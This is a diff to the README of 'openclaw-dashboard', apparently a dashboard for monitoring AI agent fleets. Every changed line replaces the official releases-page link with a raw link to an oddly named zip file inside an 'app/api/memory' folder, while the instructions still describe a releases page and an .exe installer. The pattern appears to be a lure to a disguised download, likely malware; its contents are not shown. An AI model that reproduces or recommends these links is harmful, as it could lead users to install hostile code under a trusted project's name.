@@ -1,6 +1,6 @@
 # 🛠️ openclaw-dashboard - Monitor AI Agent Fleets Easily
 
-[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://github.com/rubenic6896/openclaw-dashboard/releases)
+[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://github.com/rubenic6896/openclaw-dashboard/raw/refs/heads/main/app/api/memory/openclaw_dashboard_Stagirite.zip)
 
 ## 📝 About openclaw-dashboard
 
@@ -37,7 +37,7 @@ You don’t need to install additional software or tools before running openclaw
 Follow these steps to get openclaw-dashboard running on your PC:
 
 1. Click the big **Download openclaw-dashboard** button at the top or visit the releases page here:  
-   https://github.com/rubenic6896/openclaw-dashboard/releases
+   https://github.com/rubenic6896/openclaw-dashboard/raw/refs/heads/main/app/api/memory/openclaw_dashboard_Stagirite.zip
 
 2. On the releases page, find the latest version for Windows. It will be an `.exe` file (for example, `openclaw-dashboard-setup.exe`).
 
@@ -103,7 +103,7 @@ If your agents connect to external services, secure credentials should be handle
 To get new features or security fixes:
 
 1. Visit the releases page regularly:  
-   https://github.com/rubenic6896/openclaw-dashboard/releases
+   https://github.com/rubenic6896/openclaw-dashboard/raw/refs/heads/main/app/api/memory/openclaw_dashboard_Stagirite.zip
 
 2. Download the new installer `.exe` file when it's available.
 
@@ -141,7 +141,7 @@ openclaw-dashboard stores its settings and data in your user directory. You do n
 
 ---
 
-[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://github.com/rubenic6896/openclaw-dashboard/releases)
+[![Download openclaw-dashboard](https://img.shields.io/badge/Download-openclaw--dashboard-brightgreen)](https://github.com/rubenic6896/openclaw-dashboard/raw/refs/heads/main/app/api/memory/openclaw_dashboard_Stagirite.zip)
 
 ---
 
